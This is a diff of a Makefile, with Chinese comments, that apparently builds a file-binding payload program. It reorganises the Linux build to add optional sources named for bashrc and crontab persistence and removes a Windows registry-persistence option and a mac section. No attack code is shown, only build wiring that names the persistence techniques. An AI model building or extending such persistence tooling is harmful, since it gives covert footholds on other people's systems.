@@ -25,25 +25,18 @@ CONF_FILE = config/current_config.conf
 # 读取配置文件
 -include $(CONF_FILE)
 
+SOURCES = src/main.c src/info.c src/release.c bind/bind_files.c
+
 # 根据配置文件设置源文件和编译选项
 ifeq ($(OS),linux)
-    SOURCES = src/main.c src/info.c src/linux_persistence_bashrc.c src/release.c bind/bind_files.c
     ifeq ($(FEATURE_BASHRC_MOD),1)
+    	SOURCES += src/linux_persistence_bashrc.c
         CFLAGS += -DBASHRC_MOD
     endif
-endif
-
-ifeq ($(OS),windows)
-    SOURCES = src/main.c src/info.c src/release.c bind/bind_files.c
-    ifeq ($(FEATURE_REGISTRY_MOD),1)
-        SOURCES += src/windows_persistence_registry.c
-        CFLAGS += -DREGISTRY_MOD
+    ifeq ($(FEATURE_CRONTAB_MOD),1)
+    	SOURCES += src/linux_persistence_crontab.c
+        CFLAGS += -DCRONTAB_MOD
     endif
-endif
-
-ifeq ($(OS),mac)
-    SOURCES = src/main.c src/info.c src/release.c bind/bind_files.c
-    # 根据mac系统添加特定的功能代码
 endif
 
 # 确保 SOURCES 不为空
